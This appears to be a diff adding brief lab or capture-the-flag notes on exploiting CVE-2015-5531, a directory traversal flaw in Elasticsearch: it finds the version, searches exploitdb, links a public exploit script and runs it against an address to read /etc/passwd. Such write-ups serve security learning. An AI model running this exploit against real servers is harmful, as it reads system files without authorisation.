@@ -1,0 +1,8 @@
+"Directory traversal vulnerability in Elasticsearch allows remote attackers to read arbitrary files via unspecified vectors related to snapshot API calls."
+as soon as we access the webpage, it tells us the version number
+we can try finding an exploit for the exact version 
+sudo apt install exploitdb
+sudo apt install libxml2-utils
+searchsploit elasticsearch
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+python3 exploit_elastic.py http://34.141.12.127.31590 /etc/passwd
